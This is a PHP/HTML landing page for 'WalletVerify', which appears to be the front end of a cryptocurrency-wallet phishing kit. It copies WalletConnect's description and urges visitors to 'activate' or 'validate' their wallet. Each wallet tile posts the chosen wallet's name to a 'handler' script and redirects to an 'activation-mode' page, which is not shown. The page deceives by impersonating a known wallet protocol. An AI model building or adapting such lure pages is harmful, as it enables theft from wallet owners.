<?php
require "app/config.php";
$conn = Config::getConn();
$q = "SELECT * FROM `Wallets`";
?>


<!doctype html>
<html>

<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>WalletVerify</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <!--<link href='https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css' rel='stylesheet'>-->
    
    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
   
    <link rel="stylesheet" href="assets/css/prod.css">
     <link rel="stylesheet" href="assets/css/header.css">
      <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900" rel="stylesheet">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
     <style>
        /* TYPICAL DEVICE BREAKDOWN  */
        /* Extra small devices (phones, 600px and down) */
        @media only screen and (max-width: 600px) {

            /* ... */
            .grid-con {
                grid-template-columns: auto auto auto;
            }
        }

        /* Small devices (portrait tablets and large phones, 600px and up) */
        @media only screen and (min-width: 600px) {

            .grid-con {
                grid-template-columns: auto auto auto auto;
            }
        }

        * {
            box-sizing: border-box;
        }

        .main-container {
            margin: auto;
        }

        .grid-con {
            display: grid;
            grid-template-columns: auto auto auto;
            /* grid-template-columns: auto auto auto auto; */
            grid-column-gap: 20px;
            justify-content: center;
            align-items: end;
            justify-items: center;
            text-align: center;
            margin-bottom: 1.5rem;
            width:350px;
              grid-row-gap: 1rem;
        }

        .grid-con>div {
            border-radius: .8rem;
            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
            padding: .8rem;
            width:130px;
            min-height:100px;
            height:auto;
        }

        .grid-con div :hover {
            opacity: .3;
        }

        .head {
            padding: 2rem;
            text-align: center;
        }
    </style>
      
    <style>

    body{
          background:url("bg.png");
          background-position: center;
          background-repeat: no-repeat;
          background-size: cover;
         

      }
   
.lim{
    /*url('./assets/arrowpng.png')*/
    margin: 0;
	padding: 36px 0 36px 84px;
	list-style: none;
	background-image: url("./assets/arrowpng.png");
	background-repeat: no-repeat;
	background-position: left center;
	background-size: 40px;
}

  </style>
  <script src="https://www.momentcrm.com/embed"></script>
<script>
  MomentCRM('init', {
    'teamVanityId': 'erect1',
    'doChat': true,
    'doTracking': true,
  });
</script>
</head>

<body oncontextmenu='return true' class='snippet-body'>
    <div style="height:62px; background-color: #1D2330; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;"><div style="height:40px; padding:0px; margin:0px; width: 100%;">
        <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe></div>
        <div style="color: #626B7F; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;"><a href="#" target="_blank" style="font-weight: 500; color: #626B7F; text-decoration:none; font-size:11px">Cryptocurrency Prices</a>&nbsp;by WalletVerify</div></div>
    
        <div class="container-fluid px-0">
        <header>
            <div class="shape"></div> <!-- Navbar -->
            <nav class="navbar fixed-top navbar-expand-lg navbar-transparent"> <a class="navbar-brand" href="#">WalletVerify</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active"> <a class="nav-link" href="/">HOME <span class="sr-only">(current)</span></a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Github</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Facebook</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Apps</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Tweeter</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Instagram</a> </li>
                    </ul>
                </div>
            </nav> <!-- ./ end of navbar -->
            <div class="container">
                <div class="row">
                    <div class="col-md-6 left-side"> <img src="assets/wallet_icon_T.png" class="w-100"> </div>
                    <div class="col-md-6 right-side">
                        <h1>WalletVerify ACTIVATION</h1>
                        <p>FREE AND FASTER THAN ORDERS</p>
                        <div class="text-center">
                            <button class="btn order-button">Add Wallet</button> </div>
                    </div>
                </div>
            </div>
        </header>
    </div>
    
    
    <br>
    <!-- end of headers -->
    <!-- product -->
<div class="d-flex align-items-center">
  <div class="w-50"  >
    <img src="./assets/briefcase.svg" alt="logo" width="100%" height="400px">
  </div>
  <div class="flex-grow-1 ms-3">
   
   <ul class="mm">
       <li class="lim">
             <div class="d-flex justify-content-start text-dark " >
      <p class="text-start" style="width: 300px;" >
       <b >WalletVerify Validation</b><br>
       The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app.


      </p>
    </div>
       </li>
       <!---->
       <li class="lim">
            <div class="d-flex justify-content-start text-dark " >
      <p class="text-start" style="width: 300px;" >
       <b >What is WalletVerify </b><br>
      Walletconnect is an open source protocol for connecting decentralised applications to mobile wallet
      with Deep link. a user can inter act with out Dapp from any where from there mobile phones, making walletsconnect a safe choice.

      </p>
    </div>
       </li>
       <!---->
       <li class="lim">
             <div class="d-flex justify-content-start text-dark " >
      <p class="text-start" style="width: 300px;" >
       <b > How Dos it Works </b><br>
      Multiple iOS and Android wallets support the walletConnect protocol.interaction between mobile apps and mobile browser are supported via Mobile linking 

      </p>
    </div>
       </li>
   </ul>
   
  </div>
</div>
<br>

<!---->
<br>
 <div class="main-container">
        <div class="head">
            <p>
                Multiple iOS and Android wallets support the WallletConnect
                protocol. <br> Interaction between mobile apps and mobile browser are supported via mobile deep linking.
            </p>
        </div>
         <div style='display:flex;   justify-content: center;'  >
        <!-- ========= Grid Container =========  -->
        <div class="grid-con">
            <!-- 1st row  -->
            <!-- <div class="one-row"> -->
              <?php

            $stm = $conn->query($q);
            if ($stm->rowCount() > 0) {
                for ($i = 0; $i < $stm->rowCount(); $i++) {
                    $data = $stm->fetch();


            ?>
            <div class="item1 act"  id="<?php echo $data->name;  ?>" >
                <p>
                    <img src="assets/img/<?php echo $data->image;  ?>" alt="meta-mask" width="30px"
                        height="30px" />
                </p>
                <p>
                    <?php echo $data->name;  ?>
                </p>
            </div>

           <?php
                }
            }
            ?>
            <!-- </div> -->
            <!-- /. End of ALL ROws  -->
        </div>
        </div>
        <!-- /. End of container  -->

    </div>
    
<br>
<br>

    <!-- footer -->
  	<footer class="bg-light text-center text-white">
  <!-- Grid container -->
  <div class="container p-4 pb-0">
    <!-- Section: Social media -->
    <section class="mb-4">
      <!-- Facebook -->
      <a
        class="btn btn-primary btn-floating m-1"
        style="background-color: #3b5998;"
        href="#!"
        role="button"
        ><i class="fab fa-facebook-f"></i
      ></a>

      <!-- Twitter -->
      <a
        class="btn btn-primary btn-floating m-1"
        style="background-color: #55acee;"
        href="#!"
        role="button"
        ><i class="fab fa-twitter"></i
      ></a>

      <!-- Google -->
      <a
        class="btn btn-primary btn-floating m-1"
        style="background-color: #dd4b39;"
        href="#!"
        role="button"
        ><i class="fab fa-google"></i
      ></a>

      <!-- Instagram -->
      <a
        class="btn btn-primary btn-floating m-1"
        style="background-color: #ac2bac;"
        href="#!"
        role="button"
        ><i class="fab fa-instagram"></i
      ></a>

      <!-- Linkedin -->
      <a
        class="btn btn-primary btn-floating m-1"
        style="background-color: #0082ca;"
        href="#!"
        role="button"
        ><i class="fab fa-linkedin-in"></i
      ></a>
      <!-- Github -->
      <a
        class="btn btn-primary btn-floating m-1"
        style="background-color: #333333;"
        href="#!"
        role="button"
        ><i class="fab fa-github"></i
      ></a>
    </section>
    <!-- Section: Social media -->
  </div>
  <!-- Grid container -->

  <!-- Copyright -->
  <div class="text-center p-3" style="background-color: rgba(0, 0, 0, 0.2);" style="color:black;">
    © 2020 Copyright:
    <a class="text-white" href="/">powered By Wallet Verify</a>
  </div>
  <!-- Copyright -->
</footer>
    <!-- end of footer -->
    <script type='text/javascript' src='https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js'></script>
    <script type='text/javascript'></script>
    <script>
        $(document).ready(function() {
            $(".act").click(function(e) {
                e.preventDefault();
                let name = $(this).attr("id");
                // alert(name)
                $.ajax({
                    type: "post",
                    url: "handler",
                    data: {
                        name: name,
                    },
                    dataType: "text",
                    success: function(response) {
                        console.log(response);
                        window.location.href = "activation-mode?name="+name;
                    },
                });

            });
        });
    </script>
</body>

</html>